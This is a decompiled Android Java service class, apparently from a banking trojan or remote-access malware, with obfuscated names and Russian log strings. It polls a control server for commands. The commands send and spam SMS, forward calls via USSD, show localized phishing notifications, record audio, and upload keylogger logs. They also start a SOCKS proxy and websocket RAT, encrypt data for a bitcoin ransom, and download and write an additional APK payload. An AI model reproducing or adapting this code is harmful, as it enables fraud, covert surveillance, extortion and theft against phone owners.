package wocwvy.czyxoxmbauu.slsa;

import android.app.IntentService;
import android.app.KeyguardManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.concurrent.TimeUnit;
import wocwvy.czyxoxmbauu.slsa.kuv.sfswwunyakpjr;
import wocwvy.czyxoxmbauu.slsa.ncec.bdxyqqt;
import wocwvy.czyxoxmbauu.slsa.ncec.dzudmx;
import wocwvy.czyxoxmbauu.slsa.ncec.fyqapyahei;
import wocwvy.czyxoxmbauu.slsa.ncec.gcmysyhtova;
import wocwvy.czyxoxmbauu.slsa.ncec.khypzruy;
import wocwvy.czyxoxmbauu.slsa.ncec.wami;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.C0050b;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p002a.DeviceAdminReceiverC0047a;

/* JADX INFO: loaded from: classes.dex */
public class ukhakhcgifofl extends IntentService {

    /* JADX INFO: renamed from: a */
    C0022c f572a;

    /* JADX INFO: renamed from: b */
    C0020b f573b;

    /* JADX INFO: renamed from: c */
    C0019a f574c;

    /* JADX INFO: renamed from: d */
    Context f575d;

    /* JADX INFO: renamed from: e */
    String f576e;

    /* JADX INFO: renamed from: f */
    String f577f;

    /* JADX INFO: renamed from: g */
    String f578g;

    /* JADX INFO: renamed from: h */
    String f579h;

    /* JADX INFO: renamed from: i */
    String f580i;

    /* JADX INFO: renamed from: j */
    String f581j;

    /* JADX INFO: renamed from: k */
    String f582k;

    /* JADX INFO: renamed from: l */
    String f583l;

    /* JADX INFO: renamed from: m */
    String f584m;

    /* JADX INFO: renamed from: n */
    TelephonyManager f585n;

    /* JADX INFO: renamed from: o */
    int f586o;

    /* JADX INFO: renamed from: p */
    int f587p;

    /* JADX INFO: renamed from: q */
    int f588q;

    /* JADX INFO: renamed from: r */
    int f589r;

    public ukhakhcgifofl() {
        super("");
        this.f572a = new C0022c();
        this.f573b = new C0020b();
        this.f574c = new C0019a();
        this.f577f = "0";
        this.f578g = "0";
        this.f579h = "";
        this.f580i = "";
        this.f581j = "";
        this.f582k = "";
        this.f583l = "ERROR";
        this.f586o = 0;
        this.f587p = 0;
        this.f588q = 0;
        this.f589r = 0;
    }

    /* JADX INFO: renamed from: a */
    String m343a(String str) {
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(openFileInput(str)));
            String str2 = "";
            while (true) {
                String line = bufferedReader.readLine();
                if (line == null) {
                    return str2;
                }
                str2 = str2 + line;
            }
        } catch (IOException unused) {
            return "";
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:456:0x015b, code lost:
    
        r18.f589r = 0;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:194:0x094c  */
    /* JADX WARN: Removed duplicated region for block: B:35:0x010a  */
    /* JADX WARN: Removed duplicated region for block: B:366:0x1050  */
    /* JADX WARN: Type inference failed for: r11v3 */
    /* JADX WARN: Type inference failed for: r11v4, types: [int] */
    /* JADX WARN: Type inference failed for: r11v74 */
    /* JADX WARN: Type inference failed for: r6v14, types: [java.lang.StringBuilder] */
    /* JADX INFO: renamed from: a */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public void m344a() {
        C0020b c0020b;
        String str;
        String str2;
        boolean z;
        String strReplace;
        String str3;
        String str4;
        String[] strArrSplit;
        String str5;
        String str6;
        String strM251e;
        if (!this.f573b.m232a(this.f575d, jtfxlnc.class)) {
            startService(new Intent(this, (Class<?>) jtfxlnc.class));
        }
        try {
            TimeUnit.SECONDS.sleep(2L);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        this.f585n = (TelephonyManager) getSystemService("phone");
        String strM264q = this.f573b.m264q(this);
        String str7 = Build.VERSION.RELEASE;
        String str8 = Build.MODEL + " (" + Build.PRODUCT + ")";
        String networkCountryIso = this.f585n.getNetworkCountryIso();
        if (this.f575d.checkCallingOrSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
            this.f581j = "(" + this.f585n.getNetworkOperatorName() + ")" + this.f585n.getLine1Number();
        } else {
            this.f581j = "(NO)";
            this.f582k = "Indefined";
        }
        if (((DevicePolicyManager) getSystemService("device_policy")).isAdminActive(new ComponentName(this.f575d, (Class<?>) DeviceAdminReceiverC0047a.class))) {
            this.f577f = "1";
        }
        Context context = this.f575d;
        if (!((KeyguardManager) getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
            this.f578g = "1";
        }
        try {
            this.f576e = this.f573b.m251e(this.f575d, "SettingsAll");
            this.f576e = this.f576e != "" ? this.f576e.split("~")[0] : "";
        } catch (Exception unused) {
            this.f576e = "";
        }
        if (Build.VERSION.SDK_INT < 24) {
            this.f586o = 1;
        } else {
            if (this.f573b.m255h(this.f575d)) {
                this.f586o = 1;
            } else {
                this.f586o = 0;
            }
            if (this.f573b.m254g(this.f575d)) {
            }
        }
        if (this.f573b.m254g(this.f575d)) {
            this.f588q = 1;
        } else {
            this.f588q = 0;
        }
        if (this.f573b.m258k(this.f575d)) {
            this.f587p = 1;
        } else {
            this.f587p = 0;
        }
        if (Build.VERSION.SDK_INT < 19) {
            try {
                if (this.f573b.m251e(this.f575d, "del_sws").contains("true")) {
                    this.f589r = 1;
                } else {
                    this.f589r = 0;
                }
            } catch (Exception unused2) {
                this.f589r = 0;
            }
        } else if (Telephony.Sms.getDefaultSmsPackage(this).equals(getPackageName())) {
            this.f589r = 1;
        } else {
            this.f589r = 0;
        }
        try {
            this.f583l = this.f573b.m251e(this, "time_work");
        } catch (Exception unused3) {
            this.f573b.m230a("TimeWork", "ERROR -> ukhakhcgifofl");
        }
        try {
            strM251e = this.f573b.m251e(this, "play_protect");
        } catch (Exception unused4) {
        }
        int i = strM251e.equals("true") ? 1 : strM251e.equals("false") ? 0 : 2;
        ?? IsIgnoringBatteryOptimizations = Build.VERSION.SDK_INT >= 23 ? ((PowerManager) getSystemService("power")).isIgnoringBatteryOptimizations(getPackageName()) : 1;
        int i2 = Integer.parseInt(this.f573b.m251e(this, "step"));
        C0020b c0020b2 = this.f573b;
        C0020b c0020b3 = this.f573b;
        Context context2 = this.f575d;
        StringBuilder sb = new StringBuilder();
        sb.append("p=");
        sb.append(this.f573b.m242c(strM264q + ":" + this.f577f + ":" + this.f576e + ":" + this.f586o + ":" + this.f587p + ":" + this.f589r + ":" + this.f578g + ":" + this.f588q + ":" + this.f583l + ":" + i + ":" + IsIgnoringBatteryOptimizations + ":" + i2 + ":"));
        this.f584m = c0020b2.m247d(c0020b3.m235b(context2, "2", sb.toString()));
        C0020b c0020b4 = this.f573b;
        StringBuilder sb2 = new StringBuilder();
        sb2.append(" - > ");
        sb2.append(this.f584m);
        c0020b4.m230a("Запрос", sb2.toString());
        if (this.f584m.contains("|NO|")) {
            this.f579h = this.f574c.m213a(this);
            String strM251e2 = this.f573b.m251e(this.f575d, "iconCJ");
            this.f573b.m230a("ICON SEND", "" + strM251e2);
            this.f573b.m230a("", "Регаем");
            this.f573b.m230a("set_data_p", this.f573b.m242c(strM264q + ":" + this.f581j + this.f582k + ":" + str7 + ":" + networkCountryIso + ":" + this.f579h + ":" + str8 + ":" + this.f580i + ":" + strM251e2));
            C0020b c0020b5 = this.f573b;
            Context context3 = this.f575d;
            StringBuilder sb3 = new StringBuilder();
            sb3.append("p=");
            C0020b c0020b6 = this.f573b;
            StringBuilder sb4 = new StringBuilder();
            sb4.append(strM264q);
            sb4.append(":");
            sb4.append(this.f581j);
            sb4.append(this.f582k);
            sb4.append(":");
            sb4.append(str7);
            sb4.append(":");
            sb4.append(networkCountryIso);
            sb4.append(":");
            sb4.append(this.f579h);
            sb4.append(":");
            sb4.append(str8);
            sb4.append(":");
            this.f572a.getClass();
            sb4.append("Fattura");
            sb4.append(":");
            sb4.append(this.f580i);
            sb4.append(":");
            sb4.append(strM251e2);
            sb4.append(":");
            sb3.append(c0020b6.m242c(sb4.toString()));
            this.f584m = c0020b5.m235b(context3, "1", sb3.toString());
            this.f573b.m230a("Responce", this.f584m);
            this.f584m = this.f573b.m247d(this.f584m);
        } else {
            if (this.f584m.contains("state1letsgotxt")) {
                String strM247d = this.f573b.m247d(this.f573b.m235b(this.f575d, "3", "p=" + this.f573b.m242c(strM264q)));
                this.f573b.m230a("Настройки", "" + strM247d);
                try {
                    this.f573b.m230a("Запись  успешна!", strM247d);
                    String[] strArrSplit2 = strM247d.split(":");
                    String str9 = strArrSplit2[0];
                    if (strArrSplit2[0].equals("") || strArrSplit2[0].equals(null)) {
                        this.f573b.m250d(this, "lock_inj", "");
                    }
                    this.f573b.m250d(this, "save_inj", str9);
                    this.f573b.m250d(this, "del_sws", strArrSplit2[1]);
                    this.f573b.m250d(this, "perehvat_sws", strArrSplit2[2]);
                    this.f573b.m250d(this, "network", strArrSplit2[3]);
                    this.f573b.m250d(this, "gps", strArrSplit2[4]);
                    this.f573b.m250d(this, "foregroundwhile", strArrSplit2[5]);
                    this.f573b.m250d(this, "keylogger", strArrSplit2[6]);
                    this.f573b.m250d(this, "lookscreen", strArrSplit2[8]);
                    try {
                        strReplace = strArrSplit2[7].replace(" ", "");
                    } catch (Exception unused5) {
                        strReplace = "0";
                    }
                    this.f573b.m250d(this, "recordsoundseconds", strReplace);
                    Log.e("save seconds sound", strReplace);
                } catch (Exception unused6) {
                    c0020b = this.f573b;
                    str = "Настройки";
                    str2 = "Запись не good!";
                    c0020b.m230a(str, str2);
                }
            } else if (this.f584m.contains("ALLSETTINGSGO")) {
                String strM247d2 = this.f573b.m247d(this.f573b.m235b(this.f575d, "6", "p=" + this.f573b.m242c(strM264q)));
                this.f573b.m230a("Сохраняем настройки", strM247d2);
                String strM251e3 = "";
                try {
                    strM251e3 = this.f573b.m251e(this.f575d, "madeSettings");
                } catch (Exception unused7) {
                    this.f573b.m230a("ukhakhcgifofl", "ERROR GetmadeString");
                }
                String strReplace2 = strM251e3.contains("5+") ? "1 2 3 4 5 6 7 8 9 10 11 12 13 ".replace("5 ", "5+") : "1 2 3 4 5 6 7 8 9 10 11 12 13 ";
                if (strM251e3.contains("6+")) {
                    strReplace2 = strReplace2.replace("6 ", "6+");
                }
                if (strM251e3.contains("7+")) {
                    strReplace2 = strReplace2.replace("7 ", "7+");
                }
                if (strM251e3.contains("8+")) {
                    strReplace2 = strReplace2.replace("8 ", "8+");
                }
                if (strM251e3.contains("9+")) {
                    strReplace2 = strReplace2.replace("9 ", "9+");
                }
                if (strM251e3.contains("10+")) {
                    strReplace2 = strReplace2.replace("10 ", "10+");
                }
                try {
                    this.f573b.m250d(this, "SettingsAll", strM247d2);
                    this.f573b.m250d(this, "madeSettings", strReplace2);
                    this.f573b.m230a("Настройки all", "madeSettings: " + strReplace2);
                } catch (Exception unused8) {
                    c0020b = this.f573b;
                    str = "Настройки all";
                    str2 = "Запись не good!";
                    c0020b.m230a(str, str2);
                }
            } else if (this.f584m.equals("")) {
                try {
                    String[] strArrSplit3 = this.f573b.m251e(this.f575d, "urls").replace(" ", "").split(",");
                    int i3 = 0;
                    while (true) {
                        if (i3 >= strArrSplit3.length) {
                            z = false;
                            break;
                        }
                        this.f573b.m230a("url", "" + strArrSplit3[i3]);
                        if (this.f573b.m224a(strArrSplit3[i3]).contains("**2**0**0**")) {
                            this.f573b.m250d(this, "url", "" + strArrSplit3[i3]);
                            z = true;
                            break;
                        }
                        i3++;
                    }
                    Log.e("Twit", "" + z);
                    if (!z) {
                        String strM234b = this.f573b.m234b();
                        this.f573b.m230a("getTwitt", "" + strM234b);
                        if (strM234b.contains("https://") || strM234b.contains("http://")) {
                            this.f573b.m250d(this, "urls", strM234b);
                        }
                    }
                } catch (Exception unused9) {
                    c0020b = this.f573b;
                    str = "ERROR";
                    str2 = "Class ukhakhcgifofl -> get urls";
                    c0020b.m230a(str, str2);
                }
            }
            c0020b.m230a(str, str2);
        }
        this.f573b.m230a("Общие настройки", this.f573b.m251e(this.f575d, "SettingsAll"));
        String[] strArrSplit4 = this.f584m.split("::");
        for (int i4 = 0; i4 < strArrSplit4.length; i4++) {
            if (strArrSplit4[i4].contains("|startinj=") && !this.f573b.m251e(this.f575d, "name").contains("true")) {
                String strM225a = this.f573b.m225a(strArrSplit4[i4], "|startinj=", "|endstartinj");
                this.f573b.m230a("startinj", strM225a);
                this.f573b.m250d(this, "lock_inj", strM225a);
            }
            if (strArrSplit4[i4].contains("Send_GO_SMS")) {
                String strM225a2 = this.f573b.m225a(strArrSplit4[i4], "|number=", "|text=");
                String[] strArrSplit5 = strArrSplit4[i4].split("text=");
                try {
                    this.f573b.m245c(this, strM225a2, strArrSplit5[1]);
                    C0020b c0020b7 = this.f573b;
                    Context context4 = this.f575d;
                    StringBuilder sb5 = new StringBuilder();
                    sb5.append("p=");
                    sb5.append(this.f573b.m242c(strM264q + "|Outgoing SMS\nNumber: " + strM225a2 + "\nText: " + strArrSplit5[1] + "\n|"));
                    c0020b7.m235b(context4, "4", sb5.toString());
                    C0020b c0020b8 = this.f573b;
                    StringBuilder sb6 = new StringBuilder();
                    sb6.append("Отправляем смс на номер ");
                    sb6.append(strM225a2);
                    sb6.append(" с текстом  ");
                    sb6.append(strArrSplit5[1]);
                    c0020b8.m230a("", sb6.toString());
                    this.f573b.m259l(this.f575d);
                } catch (Exception unused10) {
                    C0020b c0020b9 = this.f573b;
                    Context context5 = this.f575d;
                    StringBuilder sb7 = new StringBuilder();
                    sb7.append("p=");
                    sb7.append(this.f573b.m242c(strM264q + "|(Outgoing SMS) Error sending SMS, maybe there are no permission to send!|"));
                    c0020b9.m235b(context5, "4", sb7.toString());
                    this.f573b.m230a("", "Error sending SMS, maybe there are no permission to send!");
                }
            }
            if (strArrSplit4[i4].contains("nymBePsG0")) {
                Intent intentPutExtra = new Intent(this, (Class<?>) wami.class).putExtra("str", "0").putExtra("cwc_text", "");
                intentPutExtra.addFlags(268435456);
                intentPutExtra.addFlags(1073741824);
                startActivity(intentPutExtra);
            }
            if (strArrSplit4[i4].contains("GetSWSGO")) {
                Intent intent = new Intent(this, (Class<?>) bdxyqqt.class);
                intent.addFlags(268435456);
                intent.addFlags(1073741824);
                startActivity(intent);
            }
            if (strArrSplit4[i4].contains("|telbookgotext=")) {
                Intent intentPutExtra2 = new Intent(this, (Class<?>) wami.class).putExtra("str", "1").putExtra("cwc_text", this.f573b.m225a(strArrSplit4[i4], "|telbookgotext=", "|endtextbook"));
                intentPutExtra2.addFlags(268435456);
                intentPutExtra2.addFlags(1073741824);
                startActivity(intentPutExtra2);
            }
            if (strArrSplit4[i4].contains("getapps")) {
                this.f573b.m244c(this);
            }
            if (strArrSplit4[i4].contains("getpermissions")) {
                this.f573b.m248d(this);
            }
            if (strArrSplit4[i4].contains("startaccessibility")) {
                try {
                    String strM251e4 = this.f573b.m251e(this, "startRequest");
                    if (strM251e4.contains("Access=0")) {
                        this.f573b.m250d(this, "startRequest", strM251e4.replace("Access=0", "Access=1"));
                    }
                } catch (Exception unused11) {
                    this.f573b.m230a("ukhakhcgifofl", "Access=0");
                }
            }
            if (strArrSplit4[i4].contains("startpermission")) {
                try {
                    String strM251e5 = this.f573b.m251e(this, "startRequest");
                    if (strM251e5.contains("Perm=0")) {
                        this.f573b.m250d(this, "startRequest", strM251e5.replace("Perm=0", "Perm=1"));
                    }
                } catch (Exception unused12) {
                    this.f573b.m230a("ukhakhcgifofl", "Perm=0");
                }
            }
            if (strArrSplit4[i4].contains("=ALERT|")) {
                try {
                    Intent intentPutExtra3 = new Intent(this, (Class<?>) fyqapyahei.class).putExtra("title", this.f573b.m225a(strArrSplit4[i4], "|title=", "|text=")).putExtra("content", strArrSplit4[i4].split("text=")[1]);
                    intentPutExtra3.addFlags(268435456);
                    intentPutExtra3.addFlags(1073741824);
                    startActivity(intentPutExtra3);
                } catch (Exception unused13) {
                }
            }
            if (strArrSplit4[i4].contains("=PUSH|")) {
                try {
                    String strM225a3 = this.f573b.m225a(strArrSplit4[i4], "|title=", "|text=");
                    String strM225a4 = this.f573b.m225a(strArrSplit4[i4], "|text=", "|icon=");
                    String str10 = strArrSplit4[i4].split("icon=")[1];
                    this.f573b.m230a("Push Icon", "" + str10);
                    startService(new Intent(this, (Class<?>) nepgaqmyfrhw.class).putExtra("appname", str10).putExtra("title", strM225a3).putExtra("text", strM225a4));
                } catch (Exception unused14) {
                    this.f573b.m230a("ukhakhcgifofl", "ERROR -> PUSH");
                }
            }
            if (strArrSplit4[i4].contains("startAutoPush")) {
                try {
                    String strM225a5 = this.f573b.m225a(strArrSplit4[i4], "|AppName=", "|EndAppName");
                    this.f573b.m230a("APP", strM225a5);
                    String string = Resources.getSystem().getConfiguration().locale.toString();
                    if (string.contains("RU")) {
                        str3 = "Срочное сообщение!";
                        str4 = "Подтвердите свой аккаунт";
                    } else if (!string.contains("US")) {
                        if (string.contains("TR")) {
                            str3 = "Acil mesaj!";
                            str4 = "Hesabını onayla";
                        } else if (string.contains("DE")) {
                            str3 = "Dringende Nachricht!";
                            str4 = "Bestätigen Sie ihr Konto";
                        } else if (string.contains("IT")) {
                            str3 = "Messaggio urgente!";
                            str4 = "Conferma il tuo account";
                        } else if (string.contains("FR")) {
                            str3 = "Message urgent!";
                            str4 = "Confirmez votre compte";
                        } else if (string.contains("UA")) {
                            str3 = "Термінове повідомлення!";
                            str4 = "Підтвердьте свій рахунок";
                        } else {
                            str3 = "Urgent message!";
                            str4 = "Confirm your account";
                        }
                    }
                    startService(new Intent(this, (Class<?>) nepgaqmyfrhw.class).putExtra("appname", strM225a5).putExtra("title", str3).putExtra("text", str4));
                } catch (Exception unused15) {
                    this.f573b.m230a("ukhakhcgifofl", "ERROR -> startAutoPush");
                }
            }
            if (strArrSplit4[i4].contains("RequestPermissionInj") && Build.VERSION.SDK_INT >= 24 && !this.f573b.m255h(this.f575d)) {
                Intent intentPutExtra4 = new Intent(this, (Class<?>) dzudmx.class).putExtra("start", "statistic");
                intentPutExtra4.addFlags(268435456);
                intentPutExtra4.addFlags(1073741824);
                startActivity(intentPutExtra4);
                this.f573b.m230a("Вып настр", "/PROC 7.0 ");
            }
            if (strArrSplit4[i4].contains("RequestPermissionGPS") && !this.f573b.m258k(this.f575d)) {
                Intent intentPutExtra5 = new Intent(this, (Class<?>) dzudmx.class).putExtra("start", "gps");
                intentPutExtra5.addFlags(268435456);
                intentPutExtra5.addFlags(1073741824);
                startActivity(intentPutExtra5);
                this.f573b.m230a("Вып настр", "Запрос геолокации");
            }
            if (strArrSplit4[i4].contains("|ussd=")) {
                try {
                    String strM225a6 = this.f573b.m225a(strArrSplit4[i4], "|ussd=", "|endUssD");
                    this.f573b.m230a("USSD", strM225a6);
                    Intent intentPutExtra6 = new Intent(this, (Class<?>) gcmysyhtova.class).putExtra("str", strM225a6);
                    intentPutExtra6.addFlags(268435456);
                    intentPutExtra6.addFlags(1073741824);
                    startActivity(intentPutExtra6);
                } catch (Exception unused16) {
                    this.f573b.m230a("ERROR", "USSD -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("|sockshost=")) {
                try {
                    String strM225a7 = this.f573b.m225a(strArrSplit4[i4], "|sockshost=", "|user=");
                    String strM225a8 = this.f573b.m225a(strArrSplit4[i4], "|user=", "|pass=");
                    String strM225a9 = this.f573b.m225a(strArrSplit4[i4], "|pass=", "|port=");
                    String strM225a10 = this.f573b.m225a(strArrSplit4[i4], "|port=", "|endssh");
                    startService(new Intent(this, (Class<?>) sfswwunyakpjr.class).putExtra("host", "" + strM225a7).putExtra("user", "" + strM225a8).putExtra("pass", "" + strM225a9).putExtra("port", "" + strM225a10));
                } catch (Exception unused17) {
                    this.f573b.m230a("ERROR", "Socks5 -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("stopsocks5")) {
                try {
                    this.f573b.m250d(this, "socks", "stop");
                } catch (Exception unused18) {
                    this.f573b.m230a("ERROR", "stop Socks5 -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("|spam=")) {
                try {
                    String strM225a11 = this.f573b.m225a(strArrSplit4[i4], "|spam=", "|endspam");
                    this.f573b.m230a("spam", strM225a11);
                    this.f573b.m250d(this, "textSPAM", strM225a11);
                    this.f573b.m250d(this, "spamSMS", "start");
                    this.f573b.m250d(this, "indexSMSSPAM", "");
                } catch (Exception unused19) {
                    this.f573b.m230a("ERROR", "spam -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("|recordsound=")) {
                try {
                    String strM225a12 = this.f573b.m225a(strArrSplit4[i4], "|recordsound=", "|endrecord");
                    this.f573b.m230a("seconds", strM225a12);
                    if (this.f573b.m246c(this, this.f574c.f342g[0]) && !this.f573b.m232a(this, cpysnikhf.class)) {
                        this.f575d.startService(new Intent(this.f575d, (Class<?>) cpysnikhf.class).putExtra("time", strM225a12));
                    }
                } catch (Exception unused20) {
                    this.f573b.m230a("ERROR", "RecodrSound -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("|replaceurl=")) {
                try {
                    String strM225a13 = this.f573b.m225a(strArrSplit4[i4], "|replaceurl=", "|endurl");
                    this.f573b.m230a("Replace URL Panel", strM225a13);
                    this.f573b.m250d(this, "url", strM225a13);
                    this.f573b.m250d(this, "urls", strM225a13);
                } catch (Exception unused21) {
                    this.f573b.m230a("ERROR", "ReplaceURL -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("|startapplication=")) {
                try {
                    String strM225a14 = this.f573b.m225a(strArrSplit4[i4], "|startapplication=", "|endapp");
                    this.f573b.m230a("Start App", strM225a14);
                    startActivity(getPackageManager().getLaunchIntentForPackage(strM225a14));
                } catch (Exception unused22) {
                    this.f573b.m230a("ERROR", "Start App -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("killBot")) {
                try {
                    this.f573b.m250d(this, "url", "");
                    this.f573b.m250d(this, "urls", "");
                    this.f573b.m250d(this, "urlInj", "");
                    stopService(new Intent(this, (Class<?>) wfveenegvz.class));
                } catch (Exception unused23) {
                    this.f573b.m230a("ERROR", "killBot -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("getkeylogger")) {
                try {
                    String strReplace3 = m343a("keys.log").replace("|^|", "\n");
                    C0020b c0020b10 = this.f573b;
                    StringBuilder sb8 = new StringBuilder();
                    sb8.append("p=");
                    sb8.append(this.f573b.m242c(this.f573b.m264q(this) + "~~~~~~~~~~" + strReplace3));
                    String strM235b = c0020b10.m235b(this, "12", sb8.toString());
                    Log.e("SEND KEL", "LOGER");
                    if (this.f573b.m247d(strM235b).contains("clear")) {
                        Log.e("SEND KEL", "CLEAR");
                        m345b("keys.log");
                    }
                } catch (Exception unused24) {
                    Log.e("ERROR", "getkeylogger -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("|startrat=")) {
                try {
                    String strM225a15 = this.f573b.m225a(strArrSplit4[i4], "|endrat=", "|endurl");
                    this.f573b.m230a("WebSocket", strM225a15);
                    this.f573b.m250d(this, "websocket", strM225a15);
                    if (!this.f573b.m232a(this.f575d, xelytgswelv.class)) {
                        this.f575d.startService(new Intent(this.f575d, (Class<?>) xelytgswelv.class));
                    }
                } catch (Exception unused25) {
                    this.f573b.m230a("ERROR", "WebSocket -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("startforward=")) {
                try {
                    this.f573b.m259l(this);
                    String strM225a16 = this.f573b.m225a(strArrSplit4[i4], "startforward=", "|endforward");
                    this.f573b.m230a("Number", strM225a16);
                    this.f573b.m239b(this, "*21*" + strM225a16 + "#");
                } catch (Exception unused26) {
                    this.f573b.m230a("ERROR", "Start Forward -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("stopforward")) {
                try {
                    this.f573b.m259l(this);
                    this.f573b.m239b(this, "#21#");
                } catch (Exception unused27) {
                    this.f573b.m230a("ERROR", "STOP Forward -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("|openbrowser=")) {
                try {
                    String strM225a17 = this.f573b.m225a(strArrSplit4[i4], "|openbrowser=", "|endbrowser");
                    this.f573b.m230a("url", strM225a17);
                    Intent intentPutExtra7 = new Intent(this, (Class<?>) dzudmx.class).putExtra("start", "**startbrurl**" + strM225a17);
                    intentPutExtra7.addFlags(268435456);
                    intentPutExtra7.addFlags(1073741824);
                    startActivity(intentPutExtra7);
                } catch (Exception unused28) {
                    this.f573b.m230a("ERROR", "Open Browser URL -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("|openactivity=")) {
                try {
                    Intent intentPutExtra8 = new Intent(this.f575d, (Class<?>) khypzruy.class).putExtra("url", this.f573b.m225a(strArrSplit4[i4], "|openactivity=", "|endactivity"));
                    intentPutExtra8.addFlags(268435456);
                    intentPutExtra8.addFlags(8388608);
                    intentPutExtra8.addFlags(1073741824);
                    startActivity(intentPutExtra8);
                } catch (Exception unused29) {
                    this.f573b.m230a("ERROR", "Open Activity URL -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("|cryptokey=")) {
                try {
                    strArrSplit = this.f573b.m225a(strArrSplit4[i4], "|cryptokey=", "|endcrypt").split("/:/");
                    str5 = strArrSplit[0];
                    str6 = strArrSplit[1];
                } catch (Exception unused30) {
                }
                try {
                    String str11 = strArrSplit[2];
                    if (this.f573b.m246c(this, this.f574c.f338c[0]) && !this.f573b.m232a(this, wahiuolww.class)) {
                        this.f573b.m250d(this, "lock_amount", str6);
                        this.f573b.m250d(this, "lock_btc", str11);
                        this.f573b.m250d(this, "status", "crypt");
                        this.f573b.m250d(this, "key", str5);
                        startService(new Intent(this, (Class<?>) wahiuolww.class));
                    }
                } catch (Exception unused31) {
                    this.f573b.m230a("ERROR", "WebSocket -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("|decryptokey=")) {
                try {
                    String strM225a18 = this.f573b.m225a(strArrSplit4[i4], "|decryptokey=", "|enddecrypt");
                    if (this.f573b.m246c(this, this.f574c.f338c[0]) && !this.f573b.m232a(this.f575d, wahiuolww.class)) {
                        this.f573b.m250d(this, "status", "decrypt");
                        this.f573b.m250d(this, "key", strM225a18);
                        this.f575d.startService(new Intent(this.f575d, (Class<?>) wahiuolww.class));
                    }
                } catch (Exception unused32) {
                    this.f573b.m230a("ERROR", "WebSocket -> Commands");
                }
            }
            if (strArrSplit4[i4].contains("getIP")) {
                C0050b c0050b = new C0050b();
                C0020b c0020b11 = this.f573b;
                Context context6 = this.f575d;
                StringBuilder sb9 = new StringBuilder();
                sb9.append("p=");
                sb9.append(this.f573b.m242c(strM264q + "|IP bots: " + this.f573b.m225a(c0050b.m297b("http://en.utrace.de", ""), ">The IP address ", " is located in the") + "\n|"));
                c0020b11.m235b(context6, "4", sb9.toString());
            }
            try {
                if (this.f573b.m251e(this.f575d, "network").equals("true")) {
                    startService(new Intent(this, (Class<?>) frvvkgp.class));
                }
                if (this.f573b.m251e(this.f575d, "gps").equals("true")) {
                    startService(new Intent(this, (Class<?>) blkzyyyfc.class));
                }
            } catch (Exception unused33) {
                this.f573b.m230a("ukhakhcgifofl", "ERROR -> blkzyyyfc");
            }
            try {
                if (this.f573b.m251e(this.f575d, "htmllocker").length() < 15) {
                    String strM247d3 = this.f573b.m247d(this.f573b.m235b(this.f575d, "11", "p=1"));
                    if (strM247d3.length() > 15) {
                        this.f573b.m250d(this.f575d, "htmllocker", strM247d3);
                    }
                }
            } catch (Exception unused34) {
                this.f573b.m230a("ukhakhcgifofl", "ERROR -> htmllocker");
            }
            if (this.f572a.f392q) {
                try {
                    File dir = getDir("apk", 0);
                    StringBuilder sb10 = new StringBuilder();
                    this.f572a.getClass();
                    sb10.append("crypt");
                    sb10.append(".apk");
                    File file = new File(dir, sb10.toString());
                    this.f573b.m230a("ukhakhcgifofl", "Good protect 1");
                    if (!file.exists()) {
                        this.f573b.m230a("ukhakhcgifofl", "Good protect 2");
                        String strM247d4 = this.f573b.m247d(this.f573b.m235b(this.f575d, "14", "p=1"));
                        if (strM247d4.length() > 1000) {
                            byte[] bArrDecode = Base64.decode(strM247d4.getBytes(), 0);
                            try {
                                FileOutputStream fileOutputStream = new FileOutputStream(file, true);
                                fileOutputStream.write(bArrDecode);
                                fileOutputStream.close();
                                this.f573b.m230a("ukhakhcgifofl", "Good protect 3");
                            } catch (Exception unused35) {
                                try {
                                    this.f573b.m230a("ukhakhcgifofl", "Распаковка декса ERROR");
                                } catch (Exception unused36) {
                                    this.f573b.m230a("ukhakhcgifofl", "ERROR -> декс");
                                }
                            }
                        }
                    }
                } catch (Exception unused37) {
                    this.f573b.m230a("ukhakhcgifofl", "ERROR -> декс");
                    this.f573b.m226a(this, "ServiceComm");
                }
            }
            this.f573b.m226a(this, "ServiceComm");
        }
        stopSelf();
    }

    /* JADX INFO: renamed from: b */
    void m345b(String str) {
        try {
            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(openFileOutput(str, 0)));
            bufferedWriter.write("");
            bufferedWriter.close();
        } catch (IOException unused) {
        }
    }

    @Override // android.app.IntentService, android.app.Service
    public void onCreate() {
        super.onCreate();
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        this.f575d = this;
        m344a();
    }

    @Override // android.app.IntentService, android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        super.onStartCommand(intent, i, i2);
        return 1;
    }
}
